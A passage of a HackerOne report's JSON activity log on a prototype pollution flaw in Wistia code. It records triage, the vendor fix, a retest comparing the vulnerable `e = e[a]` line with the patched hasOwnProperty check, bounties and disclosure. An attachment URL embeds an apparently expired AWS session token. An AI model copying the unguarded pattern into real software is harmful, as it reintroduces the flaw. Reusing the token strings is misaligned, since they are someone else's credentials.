inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-20T03:46:10.799Z","updated_at":"2020-09-20T03:46:10.799Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":994868,"filename":"hackerone.gif","type":"image/gif","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gGjPbcKiRnsg7isoXhWbVHbu?response-content-disposition=attachment%3B%20filename%3D%22hackerone.gif%22%3B%20filename%2A%3DUTF-8%27%27hackerone.gif\u0026response-content-type=image%2Fgif\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUIB4UHNM%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T071813Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCxIrj1doJNRgPl0K9hS5p6f7Tw0ZCLxkR3Tow%2FyKAUywIgCWjTM%2B0MIHMBZ2imZkb4IzrAjagqoPfY1Jv5eTsZNXgqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDLMTbQx26P2FczjSiyqRA%2FLPPp2oskzA0CfrdSUEMOlMvP48BEyVmuBCHzMHL1enXiFYCfOobepv6PEAMMeqbAh54%2B2%2F665l%2BMJKVPRWgDDDDFNErFPUSo3zrxmGMsfp3ydxzz3PH%2Bfz56AAEkhaRf3CDGMe9Ga%2F3sQhwsNKk%2BWRbSxPjyYj9kp0HLCN0LSRdWYY2u9s9zQUbMDwo0MARzdntum%2BwmYGP0HZ4wF7TAG4PadX5fZZLNq75k6dp7JuiSQgm%2BBCm08N2PPj5%2FA2Ibkj2p8IS%2FdqMrv6eGwDRBM4jnNHbuhpYfhiBf2hqHoA4ve8DvyEEjjysfdvhM9uyBDiEBkPUaTb5%2FRb5KoDN6kwoSap1GrI9FNFBwwPLRcFVdbpaUyhUYP4%2BQCBBKC0pmx3lY0nJOdl5CCJoQPkWx7PShTJyM3xaAkIqPuNVNctFUCX%2BdUSMgTV0e%2FX%2Fb4YFTr%2BRaGrekVG4XUAU1KvpMz5xtQobvDDjUlkz6RgQdKF%2BsoAj%2FoAaE32eX5nfk%2BbcwnPZneLkQv2oDvQ7xIKq%2BAIMLSjq%2F8FOusB86dSG6YigMM%2B4aJ4fSacVAzfpXK4ZEQh8HWeRY6qSeFWr5lwPKvQ0iBOrP8%2FwWCCdfICp3rmg9sSKwaSFXovUcDOizwrg0UsIEOtZtzLbX0SX3qA8bsmsLQd8uZ0TnhRbUfjzNKWZWR1norGGjkaRvLgO49zv%2FDoBEmBW0LfRd9AIw1LRyLc6S%2BYAOnQQTzCAVD2bf4H94W0Bleosp5xxA6yu5quq8eNM0dkMvid0%2Bz06Lp5p6kOBLlnhY2JGv94mdqrGgeLHphVreAmW2qxUltNYxjsF3u0LHWxiwbIkzNwDFxJoIjwt8GIOQ%3D%3D\u0026X-Amz-Signature=667b99f9043282a9dabbdd50fcd95717b4d4feab4e58ab58a4a4de99ad503f16"}],"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9271717,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-20T21:12:15.792Z","updated_at":"2020-09-20T21:12:15.792Z","actor":{"username":"corb3nik","cleared":true,"url":"/corb3nik","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/wVdvnChZPXG1bBFTnfDMx3zU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9275544,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @vakzz,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@saffron","markdown_message":"\u003cp\u003eHi \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/saffron\"\u003e@saffron\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-21T10:20:42.174Z","updated_at":"2020-09-21T10:20:42.174Z","actor":{"username":"saffron","cleared":false,"url":"/saffron","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/cY5cPzjJeGeBPzeaefv49om9/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":9276040,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @vakzz\n\nI'm discussing this submission internally with the HackerOne team. You will be updated as soon as there is additional information to share. Thanks for your patience!\n\nRegards,\n@saffron ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m discussing this submission internally with the HackerOne team. You will be updated as soon as there is additional information to share. Thanks for your patience!\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n\u003ca href=\"/saffron\"\u003e@saffron\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-21T10:58:21.168Z","updated_at":"2020-09-21T10:58:21.168Z","actor":{"username":"saffron","cleared":false,"url":"/saffron","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/cY5cPzjJeGeBPzeaefv49om9/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":9283702,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @vakzz - nice find! I'll reach out to our contact at Wistia and work with them to remediate this. Since we'll have to coordinate this with a 3rd party it may take longer than usual to get replies back. Thanks in advance for your patience. Happy hacking!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e - nice find! I\u0026#39;ll reach out to our contact at Wistia and work with them to remediate this. Since we\u0026#39;ll have to coordinate this with a 3rd party it may take longer than usual to get replies back. Thanks in advance for your patience. Happy hacking!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-21T21:56:08.148Z","updated_at":"2020-09-21T21:56:08.148Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9309598,"is_internal":false,"editable":false,"type":"Activities::BugRetesting","message":"Hi @vakzz and @corb3nik - the Wistia team notified us that they've released a fix for this problem last night. Would you mind retesting this to confirm their fix? Thanks!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e and \u003ca href=\"/corb3nik\"\u003e@corb3nik\u003c/a\u003e - the Wistia team notified us that they\u0026#39;ve released a fix for this problem last night. Would you mind retesting this to confirm their fix? Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-23T16:13:02.070Z","updated_at":"2020-09-23T16:13:02.343Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","report_retest":{"id":2393,"retest_subscription":{"triage":false}},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9309719,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jobert,\n\nLooks good! The prototype pollution vulnerability seems to be fixed, and the payload in this report does not work anymore.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jobert\"\u003e@jobert\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eLooks good! The prototype pollution vulnerability seems to be fixed, and the payload in this report does not work anymore.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-23T16:29:16.079Z","updated_at":"2020-09-23T16:29:16.079Z","actor":{"username":"corb3nik","cleared":true,"url":"/corb3nik","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/wVdvnChZPXG1bBFTnfDMx3zU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9311196,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @corb3nik, thanks for confirming! @vakzz would you mind completing the retest in the UI so I can move it along? Thanks!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/corb3nik\"\u003e@corb3nik\u003c/a\u003e, thanks for confirming! \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e would you mind completing the retest in the UI so I can move it along? Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-23T18:19:41.137Z","updated_at":"2020-09-23T18:19:41.137Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9312798,"is_internal":false,"editable":false,"type":"Activities::UserCompletedRetest","message":"Looking at the patch diff, previous when creating that params object and getting a nested object the code was just:\n\n```javascript\n(e = e[a]);\n```\n\nAfter the patch it has been changed to:\n\n```javascript\n(e = e.hasOwnProperty(a) ? e[a] : void 0);\n```\n\nSince `e.hasOwnProperty('__proto__')` is false this will prevent it from being used.","markdown_message":"\u003cp\u003eLooking at the patch diff, previous when creating that params object and getting a nested object the code was just:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter the patch it has been changed to:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehasOwnProperty\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e?\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"k\"\u003evoid\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSince \u003ccode\u003ee.hasOwnProperty(\u0026#39;__proto__\u0026#39;)\u003c/code\u003e is false this will prevent it from being used.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-23T22:15:20.892Z","updated_at":"2020-09-23T22:15:20.892Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9312805,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jobert,\n\nSorry I'm in Australia and only just starting my day :) I've filled in the retest section, let me know if there is anything else.\n\nCheers,\nWill","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jobert\"\u003e@jobert\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eSorry I\u0026#39;m in Australia and only just starting my day :) I\u0026#39;ve filled in the retest section, let me know if there is anything else.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nWill\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-23T22:16:35.766Z","updated_at":"2020-09-23T22:16:35.766Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9313648,"is_internal":false,"editable":false,"type":"Activities::ReportRetestApproved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-24T02:19:01.974Z","updated_at":"2020-09-24T02:19:01.974Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"HackerOne"}},"genius_execution_id":null,"team_handle":"security","report_retest_user":{"user":{"username":"vakzz"},"report_retest":{"retest_subscription":{"tag":"new","triage":false,"awarding_retesters":true}}},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9313649,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-24T02:19:02.061Z","updated_at":"2020-09-24T02:19:02.061Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"vakzz","url":"/vakzz"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9313654,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-24T02:19:49.849Z","updated_at":"2020-09-24T02:19:49.849Z","additional_data":{"old_severity":"Medium","new_severity":"Low (3.6)","old_severity_id":850957,"new_severity_id":855140},"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9313657,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for bringing this to our attention, it's much appreciated!","markdown_message":"\u003cp\u003eThanks again for bringing this to our attention, it\u0026#39;s much appreciated!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-24T02:20:10.226Z","updated_at":"2020-09-24T02:20:10.226Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"HackerOne"}},"bounty_amount":"250.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"corb3nik","url":"/corb3nik"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9313658,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"-","markdown_message":"\u003cp\u003e-\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-24T02:20:10.581Z","updated_at":"2020-09-24T02:20:31.037Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"HackerOne"}},"bounty_amount":"250.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"vakzz","url":"/vakzz"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9322713,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi @vakzz and @corb3nik - thanks again for bringing this to our attention, this was a nice find and exploit! As per our policy, we publicly disclose every valid security vulnerability that has been reported to us. I've gotten approval from Wistia's VP engineering to go ahead with the disclosure. You can either agree with the disclosure right away or wait 30 days for it to be automatically disclosed. Looking forward to receive more reports from the both of you in the future!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e and \u003ca href=\"/corb3nik\"\u003e@corb3nik\u003c/a\u003e - thanks again for bringing this to our attention, this was a nice find and exploit! As per our policy, we publicly disclose every valid security vulnerability that has been reported to us. I\u0026#39;ve gotten approval from Wistia\u0026#39;s VP engineering to go ahead with the disclosure. You can either agree with the disclosure right away or wait 30 days for it to be automatically disclosed. Looking forward to receive more reports from the both of you in the future!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-24T20:10:49.853Z","updated_at":"2020-09-24T20:10:49.853Z","first_to_agree":true,"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9322894,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-24T20:29:13.030Z","updated_at":"2020-09-24T20:29:13.030Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9322895,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-24T20:29:13.116Z","updated_at":"2020-09-24T20:29:13.116Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}